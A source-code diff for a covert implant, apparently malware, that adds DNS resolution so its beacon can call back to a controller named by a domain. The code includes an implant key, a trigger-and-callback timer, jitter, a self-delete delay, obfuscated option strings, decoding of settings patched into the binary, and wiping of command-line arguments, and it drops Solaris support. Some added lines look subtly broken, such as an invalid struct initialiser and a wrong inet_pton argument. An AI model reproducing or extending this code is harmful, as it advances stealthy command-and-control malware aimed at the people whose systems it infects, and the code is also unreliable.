@@ -64,6 +64,7 @@ struct cl_args
 	unsigned int	beacon_port;
 	unsigned int	host_len;
 	char			beacon_ip[256];
+	char			dns_ip[16];
 	char			iface[16];
 	unsigned char   idKey[ID_KEY_HASH_SIZE];
 	unsigned long	init_delay;
@@ -91,12 +92,10 @@ static void printUsage(char* exeName)
 	printf("\t\t-k <id key>            - implant key phrase\n");
 	printf("\t\t-K <id key>            - implant key file\n");
 	printf("\t\t-j <jitter>            - integer for percent jitter (0 <= jitter <= 30, default: 3 )\n");
-#ifdef SOLARIS
-	printf("\t\t-I <interface>         - interface on which to listen\n");
-#endif
 	printf("\t\t-d <beacon delay>      - initial beacon delay (in seconds, default: 2 minutes)\n");
 	printf("\t\t-t <callback delay>    - delay between trigger received and callback +/- 30 seconds (in seconds)\n");
 	printf("\t\t-s <self-delete delay> - since last successful trigger/beacon (in seconds, default: 60 days)\n");
+	printf("\t\t-S <IP address>        - DNS server IP address in dotted quad notation (required if beacon address is a domain name)\n");
 	printf("\n\t\t-P <file path>       - directory path for .config and .log files (120 chars max)\n");
 #ifdef DEBUG
 	printf("\n\t\t-D <debug level>     - debug level between 1 and 9, higher numbers are more verbose\n");
@@ -122,6 +121,8 @@ int main(int argc, char** argv)
 {
 	int				c = 0;
 	char			*beaconIP = NULL;
+	char			dns_ip[16];
+	struct in_addr	beaconIPaddr = 0;
 	char			*szInterface = NULL;
 	int				beaconPort = DEFAULT_BEACON_PORT;
 	unsigned long	initialDelay = DEFAULT_INITIAL_DELAY;
@@ -137,11 +138,6 @@ int main(int argc, char** argv)
 	int				status = 0;
 #endif
 
-
-
-#if defined SOLARIS
-	int exe_path_size = 256;
-#endif
 
  	ikey[0] = '\0';
 
@@ -163,22 +159,6 @@ int main(int argc, char** argv)
         initSrandFlag = 1;
     }
 
-#if defined SOLARIS
-	memset(exe_path,0,exe_path_size);
-//	retVal = run_command("pwd", exe_path, &exe_path_size);
-//	if(retVal != 0)
-	if ( getcwd( exe_path, exe_path_size ) == NULL )
-	{
-		DLX(1, perror("getcwd()"));
-		DLX(1,printf("\tERROR: exe path returned too long for the buffer\n"));
-	}
-	else
-	{
-		//strip off new line
-		DLX(1,printf( "exec_path (pwd, cwd) is %s\n", exe_path));
-//		memset(strstr(exe_path,"\n"),0, 1);
-	}
-#endif
 
 	//To See Crypto Keys, ENABLE THIS SECTION with debug level 4...
 #if 0
@@ -192,12 +172,11 @@ int main(int argc, char** argv)
 #endif
 
 	if (args.patched == 1) {
-		// binary was patched
-		// all patched times should be already be in milliseconds
+		// Binary was patched -- all patched times should already be in milliseconds
 		DLX(1, printf("Binary was patched with arguments\n"));
 
-		beaconPort = args.beacon_port;
 		beaconIP = args.beacon_ip;
+		beaconPort = args.beacon_port;
 		szInterface = args.iface;
 		initialDelay = args.init_delay;
 		interval = args.interval;
@@ -217,6 +196,8 @@ int main(int argc, char** argv)
 		cl_string((unsigned char *)sdpath, sizeof(sdpath));
 		DLX(1, printf( "\tDecoded sdpath: %s\n", sdpath));
 		strncpy(sdcfp, sdpath, strlen(sdpath));
+		cl_string((unsigned char *)dns_ip, sizeof(dns_ip));
+		DLX(1, printf( "\tDecoded DNS server address: %s\n", dns_ip));
 
 		goto okay;
 	}
@@ -225,7 +206,7 @@ int main(int argc, char** argv)
 	// process options
 	//while(EOF != (c = getopt(argc, argv, OPT_STRING)))
 #ifdef DEBUG
-	while((c = getopt(argc, argv, "a:cD:d:hI:i:j:K:k:P:p:s:t:")) != -1)
+	while((c = getopt(argc, argv, "a:cD:d:hI:i:j:K:k:P:p:S:s:t:")) != -1)
 #else
 	while((c = getopt(argc, argv, ohshsmdlas3r)) != -1)
 #endif
@@ -335,10 +316,22 @@ int main(int argc, char** argv)
 				}
 				break;
 
+			case 'S':
+				{
+				char *address;
+				address = asloc(optarg);
+				if (strlen(address) > 16) {
+					fprintf(stderr, "%s\n", oe4);
+					return -1;
+				}
+				strncpy(dns_ip, address, sizeof(dns_ip));
+				break;
+				}
+
 			case 's':
 				// user enters self delete delay in seconds, this is NOT converted to milliseconds since Sleep is not used...
 				//delete_delay = atoi(optarg);
-				delete_delay =  strtoul( optarg, NULL, 10);
+				delete_delay =  strtoul(optarg, NULL, 10);
 				break;
 
 			case 't':
@@ -362,11 +355,14 @@ int main(int argc, char** argv)
 		DLX(1, printUsage(argv[0]));
 	}
 
-	//Make sure the IP for the beacon to send to is specified
+	// Obtain Beacon IP address
 	if (beaconIP == NULL) {
 		DLX(1, printf("No Beacon IP address specified! \n"));
 		DLX(1, printUsage(argv[0]));
 		return 0;
+	}
+	if (inet_pton(AF_INET, beaconIP, beaconIPaddr) == 0) {	// Determine if beacon IP is an address
+		beaconIPaddr = dns_resolv(beaconIP, dns_ip);		// If not, attempt a DNS lookup.
 	}
 
 	if (initialDelay > 0 && interval == 0 ) {
@@ -390,15 +386,6 @@ int main(int argc, char** argv)
 		DLX(1, printUsage(argv[0]));
 		return 0;
 	}
-
-#ifdef SOLARIS
-// SOLARIS raw socket implementation requires that we specify the specific interface to sniff
-	if ( !szInterface ) {
-		DLX(1, printf("\nYou must use the -I option for Solaris, this will abort shortly... \n\n"));
-		DLX(1, printUsage(argv[0]));
-		return -1;
-	}
-#endif
 
 	// for Linux and Solaris, zeroize command line arguments
 	clean_args(argc, argv, NULL);
@@ -512,7 +499,6 @@ static int is_elevated_permissions( void )
 	return ( geteuid() ? FAILURE : SUCCESS );
 }
 
-#if defined LINUX
 //****************************************************************************
 static void clean_args( int argc, char **argv, char *new_argv0 )
 {
@@ -540,15 +526,3 @@ static void clean_args( int argc, char **argv, char *new_argv0 )
 
     return;
 }
-#elif defined SOLARIS
-//****************************************************************************
-static void clean_args( int argc, char **argv, char *new_argv0 )
-{
-	// to silence compiler warnings
-	argc = argc;
-	argv = argv;
-	new_argv0 = new_argv0;
-
-	return;
-}
-#endif
